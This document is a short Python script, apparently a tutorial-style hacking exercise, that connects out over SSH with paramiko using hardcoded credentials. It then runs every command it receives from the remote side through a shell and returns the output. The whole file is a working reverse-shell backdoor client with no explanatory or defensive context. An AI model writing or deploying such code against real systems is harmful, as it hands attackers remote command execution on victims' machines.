#!python3

import paramiko
import subprocess

def ssh_command(ip, usr, psw, cmd, port=22):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect(ip, port=port,password=psw, username=usr)
    ssh_session = client.get_transport().open_session()
    if (ssh_session.active):
        ssh_session.send(cmd)
        print(ssh_session.recv(1024))
        while True:
            cmd = ssh_session.recv(1024)
            try:
                output = subprocess.check_output(cmd.decode(), shell=True)
                ssh_session.send(output)
            except Exception as e:
                ssh_session.send(str(e).encode())
                client.close()
    return

ssh_command('127.0.0.1', 'adam', 'eden', 'ClientConnected', 1926)